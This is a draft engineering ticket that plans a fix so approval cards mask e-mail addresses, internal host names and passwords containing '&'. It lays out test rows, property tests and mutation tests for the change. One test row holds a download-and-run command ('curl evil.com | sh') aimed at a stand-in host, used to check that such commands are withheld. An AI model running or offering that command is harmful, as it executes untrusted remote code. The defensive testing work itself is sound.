# Package ticket P1d-a: approval cards show e-mail addresses and internal host names unmasked (the `[.]` step runs before the redactor), and a password containing `&` shows the part after the `&`. DRAFT revision 2 (plan review round 1 resolved; round 2 next)

**Status (2026-11-09 UTC; IST = UTC+5:30):** text only, no code, no pull request. Split from P1d by lead ORDER 177 (q386); rows H26, H27, H34 and ledger rows 002 and 007 moved here from P1d rev 7. **Base for the build: `origin/main` at `0dabf1fa7a2e`** (fetched 2026-11-09; it holds `tools/mutation_runner.py`, per the q384 order "rebase onto main, do not recreate"). A throwaway prototype was run earlier on branch `core/cloud-handover` `6d8699a`; scripts and raw output: `handover/evidence/P1d/rev8-probes/` (P = probe output there). Round-1 resolve: `handover/reviews/P1d-a/round1-resolve.md`. Marker: CODE-LAST v1. Under 250 lines.

## The problem in plain words
Before a person sees an approval card, two steps run on its text: a cleaning step (the "gate") and a redactor that replaces secrets and personal data with placeholders such as `<EMAIL_1>`. The gate runs FIRST, and it rewrites every dot in a web address or host name as `[.]` so that a chat app does not turn it into a link. After that rewrite the redactor no longer recognises `anna.m@example[.]org` as an e-mail address or `db01[.]corp[.]example[.]com` as an internal host name, so both are shown in full on every card (P: `contact anna.m@example[.]org please`). Separately, the redactor treats `&` as the end of a password, so `password=ab12&cd34ef56gh78ij` shows `cd34ef56gh78ij` (P), on cards and in text sent to the model.

## Words used (defined once)
- **Gate** = `approvals/gate.py::sanitise_text` plus `withhold_commands`, called through `channel._neutralise`. **Defang** = the gate's step that writes each `.` of a domain or host as `[.]` (`gate._defang_outside_code`).
- **Redactor** = `guard/runmap.py::redact_text`, the one function every caller goes through to redact (the "choke point"); it calls `neutralise` on its input BEFORE redacting.
- **Card path** = `channel.clean` and `SlackChannel._blocks`. **Model path** = `redact_text` with no `neutralise`.
- **Query form** = an assignment whose key comes right after `?` or `&` (a URL query such as `?password=x&next=/home`). **Plain form** = any other assignment (`password=x` in a config line, a log, a message).
- **Over-mask** = text that is not secret but is hidden because it follows a secret (accepted by ORDER 166 item 2; measured and reported apart from leaks).
- **Idempotent** = running it twice gives the same text as running it once. **Lookbehind** = a regex condition on the character just before a match.
- Legend for rows: fb = fails on the base, passes after; pb = passes on the base with the same output; ow = accepted over-mask, counted separately.

## Code facts (R = read on `origin/main` `0dabf1f` by symbol; line numbers are for that SHA; P = probe on `6d8699a`)
- R0: between `6d8699a`-line code and main, `gate.py` differs only in its header, `channel.py` and `slack_channel.py` not at all, `redact.py` in two unrelated `_COMMON` words, `runmap.py` by 54 lines (main adds `partial_escape_start`). BS-0 re-runs every row on main.
- R1: `channel._neutralise(text) = withhold_commands(sanitise_text(text))` (`channel.py:47-48`); `clean` calls `redact_text` on the text (`:29`) and, when tags were removed, on the joined view (`:36`) and returns `alt` (`:39`) or `out` (`:43`). `SlackChannel._blocks` imports the same `_neutralise`, runs `withhold_commands(req.summary)`, then `redact_text` (`slack_channel.py:75-81`), then the length check (`:82`).
- R2: defang is the last step of `gate._clean_line` (`gate.py:264`). `_clean_line` is called for prose lines (`_clean_prose`, `:272`), the fence opener's info string (`:332`) and `~~~` fence bodies (`:339`). Closed backtick fence bodies and inline code are never defanged. `_clean_prose` (`:274-278`) puts a zero-width space (ZWSP, U+200B) before a line that cleaning CHANGED and that looks like a block (`# `, `> `, `- `), so it starts no heading, quote or list; today a defang-only change counts as changed. `sanitise_text` has no other caller in `src` (grep).
- R3: the generic assignment SECRET pattern (`redact.py:591-616`): key left boundary `(?<![\w.\-])`; value class `[^\s"';,&]` plus two HTML-entity alternatives and a comma rule. Its comment says "`&` stops a URL query-param value at the next parameter". Pinned by `tests/warden_port/test_redaction.py::test_query_param_credentials_are_masked` (`?password=SuperSecretPw99&next=/home` must keep `/home`).
- R4: `redact()` applies `PATTERNS` one after another with `pattern.sub` (`redact.py:921-922`): the ORDER of two overlapping entries decides the result.
- R5: `redact` is imported into runmap by name (`runmap.py:25`), so a test spy patches `hadavin_sdk.guard.runmap.redact`. It is called once for the text and once per decoded view.
- R6 (sibling search for "`&` ends a value"): hex-key SECRET entry (`redact.py:622-630`, value `[0-9a-f]{32,}`: `&` is not hex), HIGHENTROPY (`:637-643`, base64 and url-safe alphabets have no `&`), AZURESAS `sig=` (`:208`, always a URL query value: stopping at `&` is its grammar) are not siblings. `_PIECE` (`:813`, used at `:965`) splits a LEARNED secret into extra pieces to sweep: splitting at `&` only adds masks (safe direction); not a sibling. Row KV1 pins the whole known value.
- P1 (base, `6d8699a`): H26 card `contact anna.m@example[.]org please`; H27 card `host db01[.]corp[.]example[.]com down`; H36a/b card shown encoded; H34a both paths `password=<SECRET_1>&cd34ef56gh78ij`; H34b `password=<SECRET_1>&amp;4xKp2Vb9Lr3NcW8dYh6uJs`; model path never defangs.
- P2 (prototype of the FLAG, the `clean` change and the `&` split ONLY; it had no D3, no `_blocks` change, no query continuation): H26 `contact <EMAIL_1> please`; H27 `host <HOSTNAME_1>.example.com down` (hence D3); H36a/b `<EMAIL_1>`; H34a-c masked whole on both paths (H34b `password=<SECRET_2>`); query rows keep `&user=bob`. A 25-file test subset (3,264 tests): `1 failed, 3259 passed, 4 skipped`; the one failure is the probe's own set-up (`FileNotFoundError` for `.gitleaks.toml`, `run-q-full.txt`). With `&` allowed in BOTH forms the pinned query test failed (`run-amp-summary.txt`); hence D2. D3, D1's `_blocks` part, G15 and the query continuation are designed, NOT probed: rows and mutants prove them at build.
- P3: H28a (`anna.m**@example.org**`) and H28b (an escape code inside the address) are NOT fixed by the defang move (P2). They stay in P1d (NEEDS LEAD 2).

## Design
- **D1 Defang after the redactor.** `gate.sanitise_text(text, *, defang: bool = True)`. The flag is passed through `_clean_line`, `_clean_prose`, `_all_prose` and both fallback returns (`:327`, `:350`), the info-string call and the `~~~` body call; with `defang=False` `_clean_line` skips `_defang_outside_code`. **ZWSP rule kept as today on purpose:** with `defang=False`, `_clean_prose` decides "changed" by comparing `_defang_outside_code(c)` with the input line, so every line that gets a ZWSP today still gets it (rows Z1-Z3). `channel._neutralise` passes `defang=False`. New public `gate.defang_text(text) -> str`: fences are read on the FINAL text with `gate._closed_fences` (the renderer reads the final text, so this is the right point); only BODY lines `start+1 .. last-1` of a closed backtick fence stay as they are; opener (with its info string) and closer lines and every other line go through the inline-code split of `_defang_outside_code`; on each prose part D3 runs first, then `_WIDE_DOTS`, `_NON_ASCII_HOST` and `_DOMAIN` defang as today. `_all_prose` output has no fences, so it is all prose to `defang_text`. Callers: `clean` applies it to what it returns (both `alt` and `out`). `SlackChannel._blocks` order: (1) `req.summary.replace("[.]", ".")` (a summary stored by the old code holds defanged, unmasked e-mails and hosts); (2) `withhold_commands`; (3) `redact_text`; (4) `defang_text`; (5) the `max_card_chars` length check on the text as shown. The model path does not change (it never defanged).
- **D2 `&` follows the URL query grammar.** The generic assignment pattern becomes two entries, same kind, same value alternatives, PLAIN FIRST then QUERY (R4: so mutant A9 is visible). (a) plain form, key lookbehind `(?<![\w.\-?&])`: `&` is part of the value, which stops at white space, a quote, `;` or the existing comma rule. (b) query form, key lookbehind `(?<=[?&])`: the value stops at `&` only when the next segment (up to the next `&`, white space, `#` or quote) holds `=`: value alternative `&(?![^\s&#"'=]*=)`. So `?password=ab&cd34&user=bob` hides `ab&cd34` and keeps `&user=bob`; a flag segment without `=` (`&debug`) is hidden (over-mask, ORDER 166). In `application/x-www-form-urlencoded` `&` separates pairs and a literal `&` in a value is `%26` (WHATWG URL Standard, section 5.1; read date UNVERIFIED, BS-0 reads it; the design also rests on the pinned test Q1). Group numbers unchanged. `&amp;` in plain form stops at its `;` on the text as written; the existing second pass over the decoded view (`runmap.py:507` onward) then masks the whole value (P2: H34b `password=<SECRET_2>`). BS-0 greps `PATTERNS[` and any count or index assumption.
- **D3 Placeholder next to a dot.** The redactor masks only the internal part of a host (`<HOSTNAME_1>.example.com`, P2), and `_DOMAIN`'s left boundary does not start a name after a `.`, so `example.com` would stay unchanged (whether Slack or GFM links it: UNVERIFIED; defanged on the safe side). On each PROSE part only (never inside code): `re.sub(r"(<[A-Z][A-Z0-9]*_[0-9]+>)\.(?=[\w-])", r"\1[.]", part)` (`\w` is Unicode, as in `_NON_ASCII_HOST`), then the existing defang: `<HOSTNAME_1>[.]example[.]com`. No left word boundary: a placeholder-shaped token after a letter is defanged too (more defang, never less; untrusted look-alikes are escaped by `neutralise`). `<A_1>.<B_2>` is unchanged (`<` is not a name character). Rows D3a-d.

## RUNG TABLE (scale of 2026-11-06: 1 no-code, 2 own core modules, 3 existing free tools, 4 free libraries, 5 own new code last)
Rung test: core change, no client, no fee, no new dependency. Rung 1 closed (R447: inside the choke point). Guarantee classes: **exact** = holds for every input of a named set, checked by a test over that set; **best effort** = holds for the tested rows only.
| component | need | rung tried | evidence | what only our code gives | guarantee | verdict |
|---|---|---|---|---|---|---|
| defang order | the redactor sees `.` before `[.]` is written | 2 (`_defang_outside_code`, `_closed_fences`, `_INLINE_CODE` behind a flag) | R1, R2, P2 | one flag, one call order | exact on set G-EH (`test_card_masks_what_model_masks`); best effort beyond | CUT-TO-CONFIG+GLUE |
| placeholder-dot rule | no linkable remainder after a masked host | 2 (`runmap.PLACEHOLDER` shape, existing defang) | designed, not probed | one substitution | exact on set G-TXT (`test_no_link_outside_code_on_card`) | CUT-TO-CONFIG+GLUE |
| `&` in a value | mask a password containing `&` | 2 (the existing pattern, split in two); 4 detect-secrets/gitleaks do not run inside our run map (UNVERIFIED) | R3, P2 | the query/plain split | exact on corpus C-AMP (0 leaks gate, BS-1); best effort beyond | KEEP-CODE (one pattern entry) |
**80 percent (R448):** both needs are met by our own existing code moved or split; no new module. Cost (estimate): build 3-4 agent-hours, plan rounds and result rounds uncapped; 0 fees, 0 model tokens.

## Goals and Non-Goals
**Goals.** (G1) E-mail addresses and internal host names (`HOSTNAME` kind) are masked on cards as on the model path, including requests stored before the fix. (G2) A card shows no linkable name outside code: every dotted name outside code is defanged in the FINAL text. (G3) A plain-form password with `&` is masked whole on both paths; a query-form value ends at `&` only before a `key=value` segment. (G4) Card structure and command withholding are unchanged (exact differential, G8 of the resolve).
**Non-Goals.** (N1) Addresses split by formatting (H28a-b): P1d. (N2) Over-mask in plain form (`password=hunter22&user=bob` hides `&user=bob`) and of `=`-less query segments: accepted, gated by BS-1. (N3) Any change to which names count as hosts.

## Failing inputs (`tests/test_p1d_a_rows.py`; literals in `tests/fixtures/p1d_cases.py`, built from parts: EM = `"anna" + "." + "m" + "@" + "example" + "." + "org"`, SV_A = `"Tq7mZ"` (5 characters), SV_B = `"4xKp2Vb9Lr3NcW8dYh6uJs"` (22); H34 requires both masked as ONE value)
"On base" = P1 or, where marked BS0, the output BS-0 records on `0dabf1f` (hard stop if it differs from what is written here). Strings use Python escapes. Card = `channel.clean(x)`; Slack = `_blocks` with the recipe of `tests/test_k5_round11.py:45-61` (`SlackChannel.__new__`, `max_card_chars = 2900`, `SimpleNamespace(summary=x, current_step=0, steps=[1], approval_id="a", status="PENDING")`, read `[0]["text"]["text"]`); model = `runmap.redact_text(x, runmap.RunMap())`.
| row | class | entry | input | on base | expected after |
|---|---|---|---|---|---|
| H26 | fb | card | `contact <EM> please` | `contact anna.m@example[.]org please` | `contact <EMAIL_1> please` |
| H27 | fb | card | `host db01.corp.example.com down`; spy R5 | `host db01[.]corp[.]example[.]com down` | `host <HOSTNAME_1>[.]example[.]com down`; spy: some call's text holds `db01.corp.example.com`, no call's text holds `[.]` |
| H36a | fb | card | `anna%2Em%40example%2Eorg` | same as input | `<EMAIL_1>` |
| H36b | fb | card | `anna&#46;m&#64;example&#46;org` | `anna&amp;#46;m&amp;#64;example&amp;#46;org` | `<EMAIL_1>` |
| E1 | fb | card | `~~~\nmail <EM>\n~~~` | BS0 (`anna.m@example[.]org` shown) | `~~~\nmail <EMAIL_1>\n~~~` |
| L7 | fb | Slack | stored summary `contact anna.m@example[.]org please` | same as input | `contact <EMAIL_1> please` |
| H34a | fb | card, model | `password=ab12&cd34ef56gh78ij` | `password=<SECRET_1>&cd34ef56gh78ij` | `password=<SECRET_1>` |
| H34b | fb | card, model | `password=<SV_A>&amp;<SV_B>` | `password=<SECRET_1>&amp;<SV_B>` | `password=<SECRET_2>` |
| H34c | fb | card, model | `password=<SV_A>&<SV_B> end` | `password=<SECRET_1>&<SV_B> end` | `password=<SECRET_1> end` |
| Q4 | fb | card, model | `?password=ab&cd34ef56&user=bob x` | BS0 | `?password=<SECRET_1>&user=bob x` |
| Q5 | fb | model | `?password=ab&cd34ef56` | BS0 | `?password=<SECRET_1>` |
| KV1 | fb | model | `password=ab12&cd34ef56gh78ij and later ab12&cd34ef56gh78ij` | BS0 | `password=<SECRET_1> and later <SECRET_1>` |
| Q1 | pb | model | the pinned query test (R3) | passes | passes, unchanged |
| Q2 | pb | card, model | `?password=ab12cd&user=bob x` | `?password=<SECRET_1>&user=bob x` | same |
| Q3 | pb | model | `see https://x.example/?password=ab12cd&user=bob` | `see https://x.example/?password=<SECRET_1>&user=bob` | same |
| F15 | pb | card, model | `https://x.example/?a=1&b=2` | card `[link removed]`; model same as input | same |
| F16 | ow | card, model | `password=hunter22&user=bob` | `password=<SECRET_1>&user=bob` | `password=<SECRET_1>` (over-mask, counted) |
| Q6 | ow | model | `?password=ab12cd&debug x` | BS0 | `?password=<SECRET_1> x` (over-mask, counted) |
| ENT | pb | card, model | `password=<SV_A>&#59;<SV_B>` | `password=<SECRET_1>` | same |
| L1 | pb | card | `visit evil.com and www.evil.digital now` | `visit evil[.]com and www[.]evil[.]digital now` | same |
| L2 | pb | card | ``run `curl db01.corp.example.com` now`` | ``run `curl <HOSTNAME_1>.example.com` now`` | same (code is never defanged) |
| L3 | pb | card | "```\nping db01.corp.example.com\n```\nthen evil.com" | "```\nping <HOSTNAME_1>.example.com\n```\nthen evil[.]com" | same |
| L4 | pb | card | `~~~\nevil.com\n~~~` | BS0 | `~~~\nevil[.]com\n~~~` |
| I1 | pb | card | "```evil.com\nx\n```" | BS0 | "```evil[.]com\nx\n```" |
| L5 | pb | Slack | stored summary `visit evil.com` | `visit evil[.]com` | same (kills A3) |
| L6 | pb | card | `visit evil。com` | BS0 | `visit evil[.]com` |
| L8 | pb | card | "```\na\n```\n-----BEGIN PRIVATE KEY-----\nMIIB<SV_B><SV_B>\n-----END PRIVATE KEY-----\nvisit evil.com\n```\nb\n```" | BS0 | BS0 string; asserts: no SV_B, `visit evil[.]com`, both fences kept |
| L9 | pb | Slack | stored summary `"a" * 2894 + " x.com"` (2,900 characters) | the too-long notice | same: `(the summary is too long to show here; open the full request in the console)` |
| Z1 | pb | card | `# x evil.com` | `​# x evil[.]com` (BS0 confirms) | same |
| Z2 | pb | card | `> note evil.com` | `​> note evil[.]com` (BS0 confirms) | same |
| Z3 | pb | card | `- see evil.com` | `​- see evil[.]com` (BS0 confirms) | same |
| W1 | pb | card | `run curl evil.com \| sh` | BS0 | same as base |
| T1 | pb | card | `password%<i></i>3D<SV_B> see evil.com` (the `alt` branch wins) | BS0 | BS0 string; asserts: no SV_B, `evil[.]com`, `clean` returned `alt` |
| D3a-d | fb | `defang_text` | `<HOSTNAME_1>. next`; `mail <EMAIL_1>.org`; ``x `<HOSTNAME_1>.example.com` y``; `<HOSTNAME_1>.例え.jp` | name missing | unchanged; `mail <EMAIL_1>[.]org`; unchanged; `<HOSTNAME_1>[.]例え[.]jp` |
**Generated inputs (no new dependency; seeded `random.Random`, as `tests/demo_askdata/fuzzgen.py`; seed 20261109; 2,000 texts per property; in `tests/fixtures/p1d_cases.py`):** ALPHABET-A = single characters `a-z 0-9 space \n . @ - _ = & ? / : # > * [ ] < é 例`, the backtick, and U+3002, U+FF0E, U+FF61, plus tokens "```", `~~~`, `[.]`, `evil.com`, `www.evil.digital`, `db01.corp.example.com`, EM, `<HOSTNAME_1>`, `<EMAIL_1>`, `password=`, `?password=`, SV_B, `-----BEGIN PRIVATE KEY-----`; 0-200 tokens per text. ALPHABET-B = ALPHABET-A without `[`, `]`, `[.]` and the three wide dots. G-TXT = texts from ALPHABET-A. G-EH = prose lines of 1-6 words from `a-z`, EM-shaped addresses and `dbNN.corp.example.com`-shaped hosts built from parts.
**Property tests:** `test_defang_text_idempotent` (G-TXT: `defang_text(defang_text(x)) == defang_text(x)`); `test_defang_text_only_rewrites_dots` (ALPHABET-B: `defang_text(x).replace("[.]", ".") == x`); `test_sanitise_text_default_unchanged` (every string literal passed to `sanitise_text`, `clean` or `withhold_commands` in `tests/warden_port/test_gate.py`, `test_gate_render.py`, `test_gate_review2.py`, `test_gate_review3.py`, `tests/test_g4_parity.py`, `test_k5_round9.py`, `test_k5_round11.py`, `test_p5p6_followups.py`, collected by AST, plus G-TXT: `sanitise_text(x) == sanitise_text(x, defang=True) == frozen[x]`, frozen in `tests/fixtures/p1d_a_gate_base.json` by BS-0); `test_pre_redaction_differential` (same inputs: `defang_text(withhold_commands(sanitise_text(x, defang=False))) == withhold_commands(sanitise_text(x))`; only exception: a real placeholder followed by `.` and a name character, compared after applying D3 to the right side; any other difference is a defect to fix); `test_no_link_outside_code_on_card` (G-TXT: in markdown-it's token stream of the final `clean(x)`, no `text` token outside code has a `_DOMAIN` or `_NON_ASCII_HOST` match); `test_card_masks_what_model_masks` (G-EH: the EMAIL and HOSTNAME originals in the card's map include those in the model path's map; exceptions: none in G-EH, which holds no formatting splits and no URLs).
**Fail-before:** the new test file runs on the base `0dabf1f` in a temporary worktree; every fb row fails with an assertion on its exact expected text (a new name such as `defang_text` is reached only after that assertion, through a helper that turns a missing name into a failure with prefix `NEW_SURFACE:`); every pb and ow row except F16 and Q6 passes. Raw output to `handover/evidence/P1d-a/fail-before.txt`, base SHA on line 1.

## Mutation plan (`tests/p1d_a_mutants.py` on `tools/mutation_runner.py`; every mutant required; a survivor is declared equivalent with a written reason or a row is added)
| mutant | planted change | killer |
|---|---|---|
| A1 | `_neutralise` passes `defang=True` again | H26, H27 spy |
| A2 | `clean` does not call `defang_text` on `out` | L1 |
| A3 | `_blocks` does not call `defang_text` | L5 |
| A3b | `_blocks` does not turn `[.]` back into `.` | L7 |
| A3c | `_blocks` checks the length before `defang_text` | L9 |
| A4 | placeholder-dot rule removed | H27 exact text, D3b |
| A5 | `defang_text` ignores inline code | L2, D3c |
| A6 | `defang_text` ignores closed backtick fences | L3 |
| A7 | plain form stops at `&` again | H34a |
| A8 | query form accepts every `&` | Q1, Q2 |
| A9 | plain-form lookbehind loses `?&` | Q2 (plain entry runs first, R4) |
| A10 | `sanitise_text` default `defang=False` | `test_sanitise_text_default_unchanged` |
| A11 | `clean` returns `alt` without `defang_text` | T1 |
| A12 | `defang_text` keeps the backtick opener line verbatim | I1 |
| A13 | `_clean_prose` "changed" check uses the undefanged line | Z1-Z3, differential |
| A14 | query form stops at every `&` (continuation removed) | Q4, Q5 |
| A15 | query-entry lookbehind `(?<=[?&])` removed | Q2 or written equivalence |
| A16 | `redact_text` second pass skipped | H34b |

## Template fields
- **Package id and name:** P1d-a, "defang after the redactor; `&` inside a password". Branch `core/P1d-a` from `origin/main` `0dabf1f`; one pull request. **Path class:** redaction; **extended review (no round cap): yes**, plan and result rounds.
- **Depends on:** nothing (no P1b, no P1a dependency; ORDER 177; the HELD gate of ORDERS 165/168 belongs to the learning-rule sibling). Ships first. P1d rev 8 is built on top of it.
- **Class (R337):** "a step that changes the text runs before the step that must read it" (defang) and "a separator character is treated as the end of a value outside the grammar where it is a separator" (`&`). Siblings: R6.
- **Source of the code:** our own code only. **Neutral default / alternative:** no vendor; `defang=True` keeps every other caller's behaviour.
- **Files (all under `src/hadavin_sdk/` unless a top-level path):** change `approvals/gate.py` (flag threading, ZWSP check, `defang_text`, D3: the defang step lives here); `approvals/channel.py` (`_neutralise`, `clean` both branches, the "Nothing transforms the text after its final redaction" comment becomes "After the final redaction only `defang_text` runs: it writes `.` as `[.]` and wide dots as `.`"); `approvals/slack_channel.py` (`_blocks` order D1); `guard/redact.py` (pattern split, query continuation, comment); `CHANGELOG.md`. Create `tests/test_p1d_a_rows.py` (rows, properties), `tests/p1d_a_mutants.py` (mutants), `tests/fixtures/p1d_cases.py` (literals, generators; P1d adds to it), `tests/fixtures/p1d_a_gate_base.json` (frozen base outputs), `tools/p1d_corpus.py` (BS-0 rows and freeze, BS-1 corpus; outputs below).
- **Interface:** `gate.sanitise_text(text, *, defang: bool = True) -> str`; `gate.defang_text(text) -> str`. No other public change.
- **Existing core code reused:** `_defang_outside_code`, `_closed_fences`, `_INLINE_CODE`, `_DOMAIN`, `_NON_ASCII_HOST`, `_WIDE_DOTS`, the `runmap.PLACEHOLDER` shape, the second pass of `redact_text`, `tools/mutation_runner.py`, the seeded-generator pattern of `fuzzgen.py`. Checked and not needed: hashing, k1b, stats, evals, store (no state is written). Not reused: running the whole redactor before the gate (broke two fuzz tests, P1d V8).
- **Hostile inputs:** encoded addresses (H36), entity `&amp;` (H34b, ENT), multi-line key between fences (L8), tag-split assignment (T1), wide dots (L6), placeholder-shaped tokens (D3), length boundary (L9). Contract suite: not applicable (no kind interface changes).
- **Security and least-privilege notes:** no identity, right or secret. The link protection is unchanged or stronger (G2 property). Test values are built from parts.
- **Race / process tests:** none (no shared state).
- **Rollback:** tag `pre-P1d-a`; revertible by a revert commit. Stored data: summaries stored by the new code hold placeholders and `[.]`; both the old and the new `_blocks` show them correctly, so no loud-failure test is needed. Semantic changes (CHANGELOG): cards show placeholders for e-mail addresses and internal host names; a plain-form password is masked up to the next space, quote or `;`; a query value continues past `&` until the next `key=value` field.
- **Reviewers:** fresh `egm-codebase-details` (correctness) + `egm-design` (adversarial), given the diff, this ticket and the evidence only.
- **Done =** a fresh round finds no blocker or major; all gates green (tests 3.12 and 3.13, ruff check, ruff format --check, bandit, guard tests, CodeQL, SonarCloud, CodeRabbit); BS-1 within its ceilings; ledger rows BL-core-p1d-002 and 007 FIXED-VERIFIED; the lead merges.

## Build steps
- **BS-0 (HARD STOP; reads and the corpus tool only, no product code):** confirm `git rev-parse origin/main` = `0dabf1f` or that the five files are unchanged since; run `tools/p1d_corpus.py --rows` on the base and write every row's base output to `handover/evidence/P1d-a/bs0-base.txt` (line 1 = base SHA); run `--freeze-gate` to write `tests/fixtures/p1d_a_gate_base.json`; read the two fuzz tests V8 names; grep `sanitise_text`, `_neutralise`, `_defang`, `PATTERNS[` in `src`, `demos`, `tests`; read WHATWG URL section 5.1 and record the date. Any row whose base output differs from the "on base" column (other than a BS0 cell, which it fills) = STOP, report to the lead, ticket revision.
- **BS-1 over-mask (ceilings set now; NEEDS LEAD 1 confirms):** corpus C-AMP = 200 texts, seed 1: 50 query URLs with 1-3 extra fields, 50 plain lines without `&`, 50 plain passwords containing `&` (H34 shape), 50 plain form bodies `password=...&user=...` (F16 shape); tails at most 100 characters. Gates: leaks (any secret character shown) = 0 of 200; over-masked texts at most 50 of 200 and 0 outside the F16 shape; longest hidden run at most 120 characters. Exceeded = build stops; numbers and failing texts go to the lead; no pull request until the lead decides. Leak and over-mask are reported as two separate numbers.

## Evidence commands (EVIDENCE RUNNER; raw output to `handover/evidence/P1d-a/evidence-<n>.md` in the `core/cloud-handover` worktree, line 1 `git rev-parse HEAD`; CI form from `.github/workflows/ci.yml` on main; each `> out 2>&1; rc=$?; tail -n 3 out; echo rc=$rc`)
```
UV_PROJECT_ENVIRONMENT=<s>/v313 uv sync --locked --no-build --python 3.13 --all-extras --group test
UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync ruff check src tests demos tools
UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync ruff format --check src tests demos tools
UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync pytest -q -m "not live and not perf" -rs
UV_PROJECT_ENVIRONMENT=<s>/v312 uv sync --locked --no-build --python 3.12 --all-extras --group test
UV_PROJECT_ENVIRONMENT=<s>/v312 uv run --no-sync pytest -q -m "not live and not perf" -rs
HADAVIN_TEST_PG_DSN=postgresql://postgres@localhost:5432/postgres UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync pytest -q -m perf -rs
UV_PROJECT_ENVIRONMENT=<s>/scan uv sync --locked --no-build --only-group scan
UV_PROJECT_ENVIRONMENT=<s>/scan uv run --no-sync bandit -q -r src demos tools -ll
UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync python tests/p1d_a_mutants.py        # alone
UV_PROJECT_ENVIRONMENT=<s>/v313 uv run --no-sync python tools/p1d_corpus.py --kind amp --seed 1 --out handover/evidence/P1d-a/bs1-overmask.txt
```
`<s>` = a folder under the session scratchpad. The two full test runs, the perf run and the mutant run are heavy: submit each through `/home/user/build/qsubmit.sh` with priority 1 (redaction), at most 3 heavy runs at once (ORDER 178). If the session has no local Postgres, the perf line is taken from the pull request's CI run (job link in the evidence file).

## Owner-facing wording (plain words)
CHANGELOG: "Approval cards now hide e-mail addresses and internal server names behind placeholders, as text sent to the model already did; this also applies to requests saved before this change. Before, they were shown with `[.]` in place of each dot. A password written with an `&` inside it is now hidden up to the next space; in a web address, the part after `&` is treated as the next field only when it has the form name=value. Some text right after such a password may also be hidden (measured: see the evidence)."

## Ledger rows closed
BL-core-p1d-002 (BLOCKER, defang before redaction, H26-H27; H28a-b stay with P1d under row 001) and BL-core-p1d-007 (MAJOR, `&` ends a value, H34).

## NEEDS LEAD
1. BS-1 ceilings as written above (ORDER 165: proposed ceilings go to the lead with the number).
2. H28a-b stay in P1d (correction to ORDER 177's "H26-H28").
3. `_blocks` turns `[.]` back into `.` before redacting, so requests stored before the fix are masked too (fix-don't-defer; changes how stored requests render).

## Revision log
Rev 1 (2026-11-09): split from P1d rev 7 by ORDER 177; D2 (query/plain split) added after the prototype showed that allowing `&` everywhere breaks the pinned query test; D3 added after the prototype showed `<HOSTNAME_1>.example.com` left linkable; H36a-b moved here (fixed by the defang move alone); H28a-b left in P1d.
Rev 2 (2026-11-09): plan review round 1 resolved (`round1-resolve.md`, 33 findings, all fixed): base pinned to main `0dabf1f` with a BS-0 hard stop; seeded stdlib generators instead of Hypothesis; exact bracket invariant; exact strings for every row; guarantee classes earned by named sets; ZWSP rule kept; pre-redaction differential; final-text link property; `alt`, `~~~`, info-string, legacy-summary and length rows; D3 regex; query `&` continuation (old N2 removed); BS-1 ceilings; sibling search R6; CI-form evidence commands; mutants A3b-c, A11-A16.
